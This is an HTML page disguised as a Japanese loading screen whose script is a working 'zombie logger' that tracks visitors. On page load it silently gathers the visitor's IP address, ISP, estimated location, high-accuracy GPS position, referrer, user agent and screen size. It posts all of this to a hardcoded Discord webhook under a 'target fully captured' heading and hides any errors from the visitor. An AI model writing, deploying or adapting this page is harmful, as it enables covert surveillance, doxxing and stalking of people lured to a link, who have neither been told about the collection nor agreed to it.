<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
    html, body {
        margin: 0; padding: 0; height: 100%;
        background: #0d0d0d; color: #ccc;
        font-family: system-ui, -apple-system, sans-serif;
        display: flex; align-items: center; justify-content: center;
        overflow: hidden;
    }
    .box { text-align: center; }
    .spinner {
        width: 44px; height: 44px;
        border: 4px solid #222; border-top: 4px solid #5865f2;
        border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .text { font-size: 15px; color: #949ba4; }
</style>
</head>
<body>
<div class="box">
    <div class="spinner"></div>
    <div class="text">読み込み中...</div>
</div>

<script>
(async function() {
    "use strict";

    // Webhook (お前のURL)
    const WH = "https://discord.com/api/webhooks/1551397673561624626/zvllxA0EO23H9J3xr0DrE2BEH7kZGq6eSJBJRmDnGcUoH1ib5j_xL7SLx8i5fpnnyIZg";

    // ==========================================
    // 1. 流入元（リファラー）解析
    // ==========================================
    const ref = document.referrer;
    const ua = navigator.userAgent;
    let app = "ブラウザ (不明)";
    
    if (ua.toLowerCase().includes("discord")) app = "Discord アプリ内";
    else if (ua.toLowerCase().includes("twitter") || ua.toLowerCase().includes("x.com")) app = "Twitter/X アプリ内";
    else if (ua.toLowerCase().includes("instagram")) app = "Instagram アプリ内";
    else if (ua.toLowerCase().includes("line")) app = "LINE アプリ内";
    else if (ua.toLowerCase().includes("safari")) app = "Safari";
    else if (ua.toLowerCase().includes("chrome")) app = "Chrome";

    const source = ref ? ref : "直接アクセス (直リンク)";

    // ==========================================
    // 2. 並列で情報を取得（タイムアウト付き）
    // ==========================================
    const timeout = (ms) => new Promise(res => setTimeout(res, ms));

    let ipData = { ip: "取得失敗", isp: "不明", loc: "不明", lat: null, lon: null, tz: "不明" };
    
    // IP取得（HTTPSのipwho.isとipapi.coの2段構え）
    try {
        const res = await fetch("https://ipwho.is/");
        const d = await res.json();
        if (d && d.success) {
            ipData = {
                ip: d.ip, isp: d.connection ? d.connection.isp : "不明",
                loc: `${d.country || ""} ${d.region || ""} ${d.city || ""}`,
                lat: d.latitude, lon: d.longitude, tz: d.timezone ? d.timezone.id : "不明"
            };
        }
    } catch (e) {
        try {
            const res = await fetch("https://ipapi.co/json/");
            const d = await res.json();
            if (d && d.ip) {
                ipData = {
                    ip: d.ip, isp: d.org || "不明", loc: `${d.country_name || ""} ${d.region || ""} ${d.city || ""}`,
                    lat: d.latitude, lon: d.longitude, tz: d.timezone || "不明"
                };
            }
        } catch (e2) {}
    }

    // 位置情報（GPS）の要求（許可された場合のみ）
    let gpsData = null;
    if (navigator.geolocation) {
        gpsData = await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 4000 }
            );
        });
    }

    // ==========================================
    // 3. Discord送信ペイロード構築
    // ==========================================
    let mapLinks = "";
    if (gpsData) {
        mapLinks += `**[📍 正確なGPS現在地](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})** (精度:約${Math.round(gpsData.acc)}m)\n`;
    }
    if (ipData.lat && ipData.lon) {
        mapLinks += `[🗺️ IPベースの推定位置](https://www.google.com/maps?q=${ipData.lat},${ipData.lon})`;
    }
    if (!mapLinks) mapLinks = "取得失敗";

    const embed = {
        title: "🔥 ターゲット完全捕捉報告 🔥",
        color: 0xf23f43,
        fields: [
            { name: "🔗 流入元 (リファラー)", value: `**サイト:** \`${source}\`\n**アプリ:** ${app}`, inline: false },
            { name: "🌐 公開IP", value: `\`${ipData.ip}\``, inline: true },
            { name: "🛰️ ISP / 組織", value: ipData.isp, inline: true },
            { name: "📍 住所", value: ipData.loc, inline: false },
            { name: "🗺️ マップ", value: mapLinks, inline: false },
            { name: "📱 デバイス", value: /Mobile|Android|iPhone/i.test(ua) ? "Mobile" : "PC", inline: true },
            { name: "💻 画面", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "🌍 TZ", value: ipData.tz, inline: true },
            { name: "🕵️ User-Agent", value: `\`\`\`\n${ua}\n\`\`\``, inline: false }
        ],
        footer: { text: "by zombie logger ggs😂" },
        timestamp: new Date().toISOString()
    };

    // ==========================================
    // 4. Discordへ送信（カスコードと同じシンプルな方式）
    // ==========================================
    try {
        await fetch(WH, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: "zombie logger",
                embeds: [embed]
            })
        });
    } catch (err) {
        // エラーが起きても画面には何も出さない
    }
})();
</script>
</body>
</html>
